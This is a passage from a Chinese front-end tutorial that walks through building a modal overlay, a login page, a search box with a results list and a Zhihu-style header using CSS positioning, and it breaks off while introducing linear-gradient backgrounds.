     src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_500"    /&gt;  &lt;/main&gt;&lt;/body&gt;</code></pre><p>CSS代码：</p><pre><code>body {  /*去除默认的样式*/  padding: 0;  margin: 0;  background-color: #f5f5f5;}nav {  position: fixed;  width: 100%;  height: 68px;  border: 1px solid #f4f4f4;  background-color: #fff;}img {  width: 100%;}main {  padding-top: 68px;}.logo {  float: left;  width: 100px;  height: 36px;  margin-left: 30px;  margin-top: 16px;}.avatar {  float: right;  width: 36px;  height: 36px;  margin-right: 30px;  margin-top: 17px;  border-radius: 50%;}</code></pre><p><strong>第一步：完成半透明背景</strong></p><p>整个半透明背景是撑满整个浏览器的,并且覆盖在所有的网页内容上面，因此我们需要设置一个fixed的容器放在BODY的最下面，如下面的HTML代码中的<code>&lt;div class="mask"&gt;&lt;/div&gt;</code></p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    ……  &lt;/nav&gt;  &lt;main&gt;    ……  &lt;/main&gt;  &lt;div class="mask"&gt;&lt;/div&gt;&lt;/body&gt;</code></pre><p>我们继续给这个mask添加CSS属性</p><pre><code>.mask {  position: fixed; /*1*/  left: 0;  right: 0;  top: 0;  bottom: 0;  background-color: rgba(0, 0, 0, 0.7); /*2*/}</code></pre><p>我们来解读下CSS的代码</p><blockquote><p>1.通过fixed,. 上下左右都为0，设置mask是撑满整个屏幕的</p><ol start="2"><li>background-color我们使用了rgba颜色设置方法，最后一位可以设 置颜色透明度，在这里，我们设置色0.7 透明</li></ol></blockquote><p>到这里，我们变完成了模态框背景半透明效果。如下图所示,我们可以尝试在全屏模式下改变浏览器大小，会发现蒙层会一直覆盖整个页面，完美达到我们想要的效果。</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/5.png" alt="image"></p><p><strong>第二步：完成模态框内部</strong></p><p>我们先来看看内部元素的标注<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/6.png" alt="image"></p><p>我们先完成内部样式,在刚才的蒙层下面,我们继续添加dom元素</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    ……  &lt;/nav&gt;  &lt;main&gt;    ……  &lt;/main&gt;  &lt;div class="mask"&gt;&lt;/div&gt;  &lt;div class="modal"&gt;    &lt;img src="https://style.youkeda.com/img/ykd-components/logo.png" /&gt;  &lt;/div&gt;&lt;/body&gt;</code></pre><p>html代码很简单,div 里面套一个<code>img</code>标签。我们继续完善CSS代码，如下所示</p><pre><code>.modal {  background-color: #fff;  /* 设置长宽 */  width: 300px;  height: 150px;  /* 设置圆角20px */  border-radius: 20px;}.modal &gt; img {  display: block;  width: 200px;  margin: 39px auto; /*1*/}</code></pre><p>上面CSS代码基本没问题,我们需要强调一点，大家注意<strong>标<br>注1</strong>处的代码，这里的代码是为了让<strong>优课达Logo</strong>上下左右居中。</p><p>常用的居中方法如下:</p><p><strong>元素水平居中。</strong></p><ol><li>如果内部是行内元素,我们可以在父容器上使用<code>text-align: center</code>。</li><li>如果内部是块状元素，我们可以在子容器上使用<code>margin: 0 auto</code> (如果此元素不是块状元素， 需要设置<br><code>display: block;</code> )。</li></ol><p><strong>元素垂直居中</strong></p><p>之后我们会讲到如何使用<code>flex</code> 实现元素的垂直居中。在这<br>里,大家可以先使用<code>margin</code>完成垂直居中效果。</p><blockquote><p>margin-top = (modal 高度- img高度) /2 //因此算下<br>来margin-top: 39px;</p></blockquote><p>到目前为止，我们完成了模态框内部的开发，下面我们将完成模态框在整个页面中居中显示。</p><p><strong>第三步：完成模态框布局</strong><br>我们需要把整个中间区域显示在浏览器的中间，我们肯定需要把设置为<code>position: fixed</code>，如下CSS</p><pre><code>.modal {  position: fixed; /*1*/  left: 50%; /*2*/  top: 50%; /*3*/  background-color: #fff;  /* 设置长宽 */  width: 300px;  height: 150px;  /* 设置圆角20px */  border-radius: 20px;}.modal &gt; img {  display: block;  width: 200px;  margin: 39px auto;}</code></pre><p>通过1、2、3设置可以初步将modal居中，但是会往右下偏<br>移部分</p><p>为什么呢?因为<code>left, top</code>都是DOM元素左上角顶点的<br>偏移。</p><p>在这种情况下，我们需要使用margin进行修正。</p><pre><code>.modal {  position: fixed;  left: 50%;  top: 50%;  margin-left: -150px; /*1*/  margin-top: -75px; /*2*/  background-color: #fff;  /*设置长宽*/  width: 300px;  height: 150px;  /*设置圆角20px*/  border-radius: 20px;}</code></pre><p>作业：</p><p>完成优课达登录页开发：<br><a href="https://www.figma.com/file/tDjSDAGbfCF02UA1PrpHng/%E9%80%89%E6%8B%A9%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E9%99%86" target="_blank" rel="noopener">优课达登录页</a></p><p><strong>注意</strong></p><blockquote><p>1.注意图片和文字之间的默认距离的去除，在第7章节第6小节<br><code>display: inline</code> 中有过描述,否则视觉还原度较差。<br>2. 整个页面的背景图片我们已经帮大家写好了，大家不用太纠<br>结，在下一章我们就会学习。<br>3. 整个页面其他部分,不需要用背景图片的知识。<br>4. 建议使用全屏浏览器进行查看。</p></blockquote><p><strong>图片资源</strong></p><p>整个背景图片大图:<br><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/login-bg.svg" target="_blank" rel="noopener">1</a><br>微信登录图标: <a href="https://style.youkeda.com/img/pizza/weixin.png" target="_blank" rel="noopener">2</a><br>QQ登录图标: <a href="https://style.youkeda.com/img/pizza/qq.png" target="_blank" rel="noopener">3</a><br>分割线:<a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/sep.png" target="_blank" rel="noopener">4</a></p><p>CSS:</p><pre><code>html,body {  height: 100%;  margin: 0;}ul,li {  margin: 0;  padding: 0;}li {  list-style: none;}h1,h2 {  margin: 0;}p {  margin: 0;  padding: 0;}/* 浏览器都有自己的默认样式，以上部分为清除浏览器默认样式 */html,body {  width: 100%;  height: 100%;}body {  background-image: url(https://document.youkeda.com/P3-1-HTML-CSS/1.8/login-bg.svg);  background-size: cover;}.modal {  position: fixed;  top: 50%;  left: 50%;  margin-left: -245px;  margin-top: -201.5px;  width: 490px;  height: 403px;  border-radius: 16px;  background-color: white;}.logo {  display: block;  width: 179px;  height: 64px;  margin: 0 auto;  margin-top: 62px;}.slogan {  text-align: center;  margin-top: 14px;  font-size: 14px;  line-height: 20px;  letter-spacing: 7.3px;  opacity: 0.45;  color: #3a3a3a;}/* 分割线区域 */.sep {  margin-top: 40px;  height: 17px;}.left {  float: left;  margin-left: 20px;}.right {  float: right;  margin-right: 20px;}.sep &gt; .line {  width: 163px;  height: 1px;  margin-top: 8px;}.sep &gt; span {  display: block;  float: left;  text-align: center;  width: 124px;  font-size: 12px;  line-height: 17px;}.login-channel {  margin-top: 40px;}.login-channel &gt; .icon {  display: block;  width: 64px;  height: 64px;}.login-channel &gt; p {  margin-top: 20px;  width: 64px;  text-align: center;  font-size: 16px;  line-height: 22px;  color: #292929;}.wechat {  float: left;  margin-left: 116px;}.qq {  float: right;  margin-right: 116px;}</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;    &lt;title&gt;优课达&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class="modal"&gt;      &lt;img        class="logo"        src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/9.svg"      /&gt;      &lt;div class="slogan"&gt;学得比别人好一点&lt;/div&gt;      &lt;div class="sep"&gt;        &lt;img          class="line left"          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/sep.png"        /&gt;        &lt;span&gt;请选择登录方式&lt;/span&gt;        &lt;img          class="line right"          src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/sep.png"        /&gt;      &lt;/div&gt;      &lt;div class="login-channel wechat"&gt;        &lt;img          class="icon"          src="https://style.youkeda.com/img/pizza/weixin.png"        /&gt;        &lt;p&gt;微信登录&lt;/p&gt;      &lt;/div&gt;      &lt;div class="login-channel qq"&gt;        &lt;img class="icon" src="https://style.youkeda.com/img/pizza/qq.png" /&gt;        &lt;p&gt;QQ登录&lt;/p&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="9-3定位实战（二）：搜索框"><a href="#9-3定位实战（二）：搜索框" class="headerlink" title="9.3定位实战（二）：搜索框"></a>9.3定位实战（二）：搜索框</h3><h4 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h4><p>在很多网站的头部都有一个搜索框，我们这一小节就来学习下这种搜索框如何进行开发，我们先来看下需要完成的案例:<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-2-search/1.png" alt="image"></p><p>大家注意图片中红色部分，就是我们这小节需要搞定的部分，这部分由两个组件构建，一个搜索框，一个搜索结果列表。</p><p>由于我们还没学习JS，因此我们不需要完成鼠标点击，键盘输入响应事件，我们默认搜索结果是直接展示的。</p><h4 id="再次回到第二小节的代码"><a href="#再次回到第二小节的代码" class="headerlink" title="再次回到第二小节的代码"></a>再次回到第二小节的代码</h4><p>在第二小节，不含模态框的HTML代码如下(<strong>为了方便窄屏浏览器预览,我们把左侧的LOGO去掉</strong>)</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="UTF-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    &lt;img      class="avatar"      src="https://thirdqq.qlogo.cn/g?b=oidb&amp;k=xnT9D0hzSGjSOOZkzqoutA&amp;s=100&amp;t=1555898643"    /&gt;  &lt;/nav&gt;  &lt;main&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_500"    /&gt;  &lt;/main&gt;&lt;/body&gt;CSS 为body {  padding: 0;  margin: 0;  background-color: #f5f5f5;}nav {  position: fixed;  width: 100%;  height: 68px;  border: 1px solid #f4f4f4;  background-color: #fff;}.logo {  width: 100px;  height: 36px;  margin-top: 16px;  margin-left: 30px;  float: left;}.avatar {  height: 34px;  width: 34px;  margin-top: 17px;  border-radius: 50%;  margin-right: 30px;  float: right;}</code></pre><h5 id="第一步-完成搜索框"><a href="#第一步-完成搜索框" class="headerlink" title="第一步:完成搜索框"></a>第一步:完成搜索框</h5><p>我们来看看头部搜索框的标注<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-2-search/2.png" alt="image"><br>在效果图中，<strong>优课达</strong>靠佐,<strong>搜索框和头像</strong>靠右，通过第二节的学习,我们知道可以用<code>float</code>来实现。在这里，我们需要把右侧输入框和头像整体包裹起来，实现靠右效果，我们来看下HTML代码</p><pre><code>……&lt;nav class="nav"&gt;  &lt;div class="right"&gt;    &lt;div class="search"&gt;      &lt;input placeholder="搜你想要的东西" /&gt;      &lt;img src="//style.youkeda.com/img/ykd-components/search.png" /&gt;    &lt;/div&gt;    &lt;img      class="avatar"      src="https://thirdqq.qlogo.cn/g?b=oidb&amp;k=xnT9D0hzSGjSOOZkzqoutA&amp;s=100&amp;t=1555898643"    /&gt;  &lt;/div&gt;&lt;/nav&gt;……</code></pre><p>我们通过一个<code>&lt;div class="right"&gt;</code> 容器包裹<code>&lt;div class="search"&gt;</code>和 <code>&lt;img class="avatar"/&gt;</code>元素，那只要我们设置<code>&lt;div Class="right"&gt;</code>靠右，那其所有的内容则会跟着靠右了。我们添加一些基础的CSS样式</p><pre><code>.right {  float: right;}.search {  float: left;  margin-right: 20px;}.search &gt; input {  width: 220px;  height: 36px;  margin-top: 16px; /*1*/  font-size: 12px;  box-sizing: border-box; /*2*/  padding: 0 50px 0 15px;  background-color: #ededed;  border-radius: 18px;  /*3*/  border: none;  outline: none;}.search &gt; img {  /*4*/  width: 34px;  height: 34px;}</code></pre><p>我们稍微解释下.上面的代码</p><ol><li><code>margin-top: 16px</code> 是计算出来的，(nav 高度- input高度) /2,和模态框中使用的计算规则一致。</li><li><code>box-sizing</code>在同时设置<code>width``height``padding</code>的时候一般会使用，防止宽度或高度异常，忘记的同学可以回顾<strong>盒模型章节</strong></li><li>去掉默认的input效果</li><li><code>&gt;</code> CSS代表直接子元毒，见<strong>CSS样式章节</strong><br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-2-search/3.png" alt="image"></li></ol><p>可以看到<strong>搜索图标</strong>还占用页面位置，我们希望其能往左下移动到<strong>Input</strong>框里面。利用之前的知识，我们可以使用<code>position:absolute</code> 让其脱离文档流。</p><p>我们给<code>.search  &gt;img</code>元素添加定位属性,切勿忘记父元素设置<code>position: relative</code></p><pre><code>.search {  position: relative;  ……}.search &gt; img {  position: absolute;  right: 10px;  top: 17px;  width: 34px;  height: 34px;}</code></pre><h5 id="第二部分：完成搜索结果"><a href="#第二部分：完成搜索结果" class="headerlink" title="第二部分：完成搜索结果"></a>第二部分：完成搜索结果</h5><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-2-search/4.png" alt="image"></p><p>我们分析下搜索结果列表的特性:</p><ol><li>搜索结果宽度和头部搜索框的宽度一致。</li><li>搜索结果脱离文档流，是浮在所有元素上面。</li></ol><p>我们在原来的<code>search</code>元素中加入搜索结果的内容，如下HTML所示:</p><pre><code>……&lt;nav class="nav"&gt;  &lt;div class="right"&gt;    &lt;div class="search"&gt;      &lt;input placeholder="搜你想要的东西" /&gt;      &lt;img src="//style.youkeda.com/img/ykd-components/search.png" /&gt;      &lt;!-- 搜索结果页面 --&gt;      &lt;ul class="search-result"&gt;        &lt;li&gt;优课达1号&lt;/li&gt;        &lt;li&gt;优课达2号&lt;/li&gt;        &lt;li&gt;优课达3号&lt;/li&gt;        &lt;li&gt;优课达4号&lt;/li&gt;      &lt;/ul&gt;    &lt;/div&gt;    &lt;img      class="avatar"      src="https://thirdqq.qlogo.cn/g?b=oidb&amp;k=xnT9D0hzSGjSOOZkzqoutA&amp;s=100&amp;t=1555898643"    /&gt;  &lt;/div&gt;&lt;/nav&gt;……</code></pre><p>注意HTML元素含义，<code>search-result</code>属于搜索内容，所以和输入框、搜索图标，一起包裹放在<code>search</code>元素内部。</p><p>我们继续给搜索结果添加样式</p><pre><code>.search-result {  position: absolute; /*1*/  left: 0;  top: 60px;  padding: 0 15px;  background-color: #fff;  border-radius: 5px;  box-shadow: 0px 1px 11px 0px rgba(0, 0, 0, 0.16); /*2*/}.search-result &gt; li {  font-size: 12px;  color: #1f2c41;  height: 36px;  line-height: 36px; /*3*/  width: 190px;  border-bottom: 1px solid #f3f3f3;}</code></pre><p>重点解释下标注1.2.3</p><ol><li>因为要脱离文档流，并且相对于| search| 父元素进行定位,因此使用绝<br>对布局。</li><li>这个CSS的一个新属性一- -阴影， 合适的阴影让元素具有层次感MDN阴<br>影</li><li>为了使文字在每个li元素中垂直居中，我们使用line-height = height进行解决。</li></ol><p>最后我们在加入去掉ul和li的默认样式</p><pre><code>ul {  margin: 0;  padding: 0;}li {  margin: 0;  padding: 0;  list-style: none; /*去掉li左侧的点*/}</code></pre><p>CSS</p><pre><code>body {  /*去除默认的样式*/  padding: 0;  margin: 0;  background-color: #f5f5f5;}nav {  position: fixed;  width: 100%;  height: 68px;  border: 1px solid #f4f4f4;  background-color: #fff;}img {  width: 100%;}main {  padding-top: 68px; /*1*/}.logo {  float: left;  width: 100px;  height: 36px;  margin-left: 30px;  margin-top: 16px;}.avatar {  float: right;  width: 36px;  height: 36px;  margin-right: 30px;  margin-top: 17px;  border-radius: 50%;}.right {  float: right;}.search {  position: relative;  float: left;  margin-right: 20px;}.search &gt; input {  width: 220px;  height: 36px;  margin-top: 16px;  font-size: 12px;  box-sizing: border-box;  padding: 0 50px 0 15px;  background-color: #ededed;  border-radius: 18px;  border: none;  outline: none;}.search &gt; img {  position: absolute;  right: 10px;  top: 17px;  width: 34px;  height: 34px;}.search-result {  position: absolute;  left: 0;  top: 60px;  padding: 0 15px;  background-color: #fff;  border-radius: 5px;  box-shadow: 0px 1px 11px 0px rgba(0, 0, 0, 0.16);}.search-result &gt; li {  font-size: 12px;  color: #1f2c41;  height: 36px;  line-height: 36px;  width: 190px;  border-bottom: 1px solid #f3f3f3;}ul {  margin: 0;  padding: 0;}li {  margin: 0;  padding: 0;  list-style: none; /*去掉li左侧的点*/}</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;    &lt;title&gt;优课达&lt;/title&gt;    &lt;meta charset="utf-8" /&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;nav class="nav"&gt;      &lt;div class="right"&gt;        &lt;div class="search"&gt;          &lt;input placeholder="搜你想要的东西" /&gt;          &lt;img src="//style.youkeda.com/img/ykd-components/search.png" /&gt;          &lt;!-- 搜索结果页面 --&gt;          &lt;ul class="search-result"&gt;            &lt;li&gt;优课达1号&lt;/li&gt;            &lt;li&gt;优课达2号&lt;/li&gt;            &lt;li&gt;优课达3号&lt;/li&gt;            &lt;li&gt;优课达4号&lt;/li&gt;          &lt;/ul&gt;        &lt;/div&gt;        &lt;img          class="avatar"          src="https://thirdqq.qlogo.cn/g?b=oidb&amp;k=xnT9D0hzSGjSOOZkzqoutA&amp;s=100&amp;t=1555898643"        /&gt;      &lt;/div&gt;    &lt;/nav&gt;    &lt;main&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_500"      /&gt;    &lt;/main&gt;    &lt;div class="mask"&gt;&lt;/div&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>完成知乎网页头部的开发，具体如下图亮色部分</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-2-search/5.png" alt="image"></p><p>figma地址<br><a href="https://www.figma.com/file/mqzUsRYM6BNOZRVJzwUvyV/%E7%9F%A5%E4%B9%8E" target="_blank" rel="noopener">标注地址</a></p><p><strong>提示.</strong></p><ol><li>为了简化大家的难度，我们去掉的一些还未学习到的知识点，大家以figma的视觉效果为准。</li><li>最后的检查会在浏览器宽度1400px下面进行，大家最好(不强求)在1400px下调整视觉效果(中间区域应该是永远左右剧中的)。</li><li>如果想修改input中placeholder的样式，在chrome中可以使用如下代码。</li></ol><pre><code>::-webkit-input-placeholder {  color: red;}</code></pre><p><strong>图片资源</strong></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/zhihu.png" target="_blank" rel="noopener">知乎logo</a></p><p><a href="http://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/search.png" target="_blank" rel="noopener">搜索图标</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E4%BD%8D%E5%9B%BE.png" target="_blank" rel="noopener">个人头像</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E6%B6%88%E6%81%AF.png" target="_blank" rel="noopener">消息图标</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E9%80%9A%E7%9F%A5.png" target="_blank" rel="noopener">通知图标</a></p><p><a href="http://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E4%B8%AA%E4%BA%BA.png" target="_blank" rel="noopener">个人设置-我的主页</a></p><p><a href="http://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E8%AE%BE%E7%BD%AE.png" target="_blank" rel="noopener">个人设置-设置</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E9%80%80%E5%87%BA.png" target="_blank" rel="noopener">个人设置-退出</a></p><p>zhihu.css</p><pre><code>html,body {  height: 100%;  margin: 0;}ul,li {  margin: 0;  padding: 0;}li {  list-style: none;}h1,h2 {  margin: 0;}p {  margin: 0;  padding: 0;}/* 浏览器都有自己的默认样式，以上部分为清除浏览器默认样式 */.nav {  height: 54px;  border-bottom: 1px solid #eeeeee;}.content {  position: relative;  width: 1000px;  margin: 0 auto;}.left {  float: left;}.right {  float: right;}.logo {  width: 64px;  height: 30px;  margin-top: 12px;  margin-right: 40px;  float: left;}ul.menu {  float: left;  height: 100%;}ul.menu li {  height: 100%;  float: left;  font-weight: 500;  font-size: 16px;  line-height: 54px;  color: #8892a6;  margin-right: 30px;}ul.menu li.active {  position: relative;  color: #1c1c1c;}ul.menu li.active .bottom {  position: absolute;  bottom: 0;  left: 50%;  margin-left: -15px;  width: 30px;  height: 3px;  background-color: #1987fb;}.search {  position: relative;  float: left;  width: 326px;  height: 34px;  margin-top: 10px;  margin-right: 16px;  margin-left: 10px;}::-webkit-input-placeholder {  /* WebKit browsers */  color: #8892a6;  font-weight: 500;  font-size: 14px;}.search input {  height: 100%;  width: 100%;  box-sizing: border-box;  background: #f6f6f6;  border: 1px solid #ebebeb;  border-radius: 3px;  padding: 7px 15px;  font-size: 14px;}.search-icon {  position: absolute;  right: 15px;  top: 9px;  width: 16px;  height: 16px;}.ask-btn {  width: 58px;  height: 34px;  margin-top: 10px;  text-align: center;  font-size: 14px;  line-height: 34px;  color: #ffff;  background: #0084ff;  border: 1px solid #0084ff;  border-radius: 3px;}.avatar {  float: right;}ul.right li {  float: right;  margin-left: 36px;  width: 26px;  height: 26px;  margin-top: 14px;}ul.right li &gt; img {  width: 100%;  height: 100%;}ul.right li.avatar {  width: 30px;  height: 30px;  margin-top: 12px;}.setting {  position: absolute;  right: -52px;  top: 48px;  box-sizing: border-box;  width: 134px;  height: 122px;  background: #ffffff;  border: 1px solid #ebebeb;  border-radius: 4px;  padding: 16px 18px 0 18px;}.setting ul li {  margin-bottom: 15px;  height: 20px;}.setting ul li.last {  margin-bottom: 0;}.setting ul li img {  margin-top: 2px;  width: 16px;  height: 16px;  float: left;}.setting ul li div {  float: left;  height: 20px;  font-weight: 500;  font-size: 14px;  line-height: 20px;  color: #8892a6;  margin-left: 5px;}</code></pre><p>zhihu.html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;link rel="stylesheet" type="text/css" href="./zhihu.css" /&gt;    &lt;title&gt;知乎&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;nav class="nav"&gt;      &lt;div class="content"&gt;        &lt;div class="left"&gt;          &lt;img            class="logo"            src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/zhihu.png"          /&gt;          &lt;ul class="menu"&gt;            &lt;li class="active"&gt;              首页              &lt;div class="bottom"&gt;&lt;/div&gt;            &lt;/li&gt;            &lt;li&gt;发现&lt;/li&gt;            &lt;li&gt;等你来答&lt;/li&gt;          &lt;/ul&gt;          &lt;div class="search"&gt;            &lt;input type="text" placeholder="美妆博主" /&gt;            &lt;img              class="search-icon"              src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/search.png"            /&gt;          &lt;/div&gt;          &lt;button class="ask-btn"&gt;提问&lt;/button&gt;        &lt;/div&gt;        &lt;ul class="right"&gt;          &lt;li class="avatar"&gt;            &lt;img              src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E4%BD%8D%E5%9B%BE.png"            /&gt;          &lt;/li&gt;          &lt;li class="message"&gt;            &lt;img              src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E6%B6%88%E6%81%AF.png"            /&gt;          &lt;/li&gt;          &lt;li class="notice"&gt;            &lt;img              src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E9%80%9A%E7%9F%A5.png"            /&gt;          &lt;/li&gt;        &lt;/ul&gt;        &lt;div class="setting"&gt;          &lt;ul&gt;            &lt;li&gt;              &lt;img                src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E4%B8%AA%E4%BA%BA.png"              /&gt;              &lt;div&gt;我的主页&lt;/div&gt;            &lt;/li&gt;            &lt;li&gt;              &lt;img                src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E8%AE%BE%E7%BD%AE.png"              /&gt;              &lt;div&gt;设置&lt;/div&gt;            &lt;/li&gt;            &lt;li class="last"&gt;              &lt;img                src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/zhihu/%E9%80%80%E5%87%BA.png"              /&gt;              &lt;div&gt;退出&lt;/div&gt;            &lt;/li&gt;          &lt;/ul&gt;        &lt;/div&gt;      &lt;/div&gt;    &lt;/nav&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="第十章：CSS背景"><a href="#第十章：CSS背景" class="headerlink" title="第十章：CSS背景"></a>第十章：CSS背景</h2><h3 id="10-1背景颜色"><a href="#10-1背景颜色" class="headerlink" title="10.1背景颜色"></a>10.1背景颜色</h3><h4 id="渐变色"><a href="#渐变色" class="headerlink" title="渐变色"></a>渐变色</h4><p>在之前的课程中，我们已经介绍了怎么设置背景颜色，我们先来温故一下普通颜色的几种写法:</p><pre><code>background: red;background: #ffffff;background: rgba(200, 200, 200);background: rgba(0, 0, 0, 0.5);</code></pre><p>之前的颜色都是纯色,这一节我们来学习一些高级的技巧，怎么利用<code>background</code>这个属性设置渐变色。<br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/1.png" alt="image"></p><pre><code>左边的色值:   #95CA47右边的设置为:  #4DC891</code></pre><p>我们先实现主体的按钮样式，HTML 和CSS如下:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;button class="publish"&gt;我要提问&lt;/button&gt;&lt;/body&gt;</code></pre><pre><code>.publish {  width: 100%;  height: 50px;  line-height: 50px;  color: #fff;  font-size: 18px;  border-radius: 4px;  font-weight: 500;  box-shadow: 0 2px 6px 0 rgba(104, 200, 116, 0.3); /*1*/}</code></pre><blockquote><p>标注1处的代码是添加阴影效果，大家马上会学到，先不用特别纠结</p></blockquote><p>效果：<br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/2.png" alt="image"></p><p>在图中，我们看到已经有了<strong>边框,阴影，圆角</strong>效果，文字因为是白色所以看不出来，下面我们需要给按钮加入渐变背景色。</p><p>我们得学习<code>background</code>的一个新的值– <strong>linear-gradiente</strong><br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/3.png" alt="image"><br>根据上图，我们设置好<strong>渐变类型、渐变方向、开始颜色、结束颜色</strong>即可实现简单的渐变效果。</p><h4 id="渐变方向"><a href="#渐变方向" class="headerlink" title="渐变方向"></a>渐变方向</h4><p>渐变方向使用的语义化英文实现，具体有如下值</p><ul><li>to right/ to left向右/向左渐变</li><li>to top/ to bottom向上/向下渐变</li><li>to right bottom / to right top向右下/向右上渐变</li><li>toleft bottom / to left top向左下向左上渐变</li><li>xxxdeg xxx范围(0到360)更精确的渐变方向</li></ul><p>演示一下，如何把背景渐变色改为从右上到左下</p><pre><code>.publish {  width: 100%;  height: 50px;  line-height: 50px;  background: linear-gradient(to left bottom, #95ca47, #4dc891);  color: #fff;  font-size: 18px;  border-radius: 4px;  font-weight: 500;  box-shadow: 0 2px 6px 0 rgba(104, 200, 116, 0.3); /*1*/}</code></pre><h4 id="渐变位置"><a href="#渐变位置" class="headerlink" title="渐变位置"></a>渐变位置</h4><p>渐变不一定是从开始到结束，我们可以设置各种中间状态。我们来看一个更复杂的例子，在上面的例子下升级,我们不需要一开始就进行渐变，而是在30% ~ 70%之间进行渐变,如图所示:<br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.10/1-gradient/4.png" alt="image"><br>我们可以在每个色值后面跟一个值<strong>百分比，PX</strong>,来约定变色起止位置。</p><p>演示一下:</p><pre><code>.publish {  width: 100%;  height: 50px;  line-height: 50px;  background: linear-gradient(to right, #95ca47 30%, #4dc891 70%);  color: #fff;  font-size: 18px;  border-radius: 4px;  font-weight: 500;  box-shadow: 0 2px 6px 0 rgba(104, 200, 116, 0.3); /*1*/}</code></pre><p>上面讲的是最通用，最常见的渐变效果。除此之外，还支持多颜色渐<br>变、弧形渐变，<a 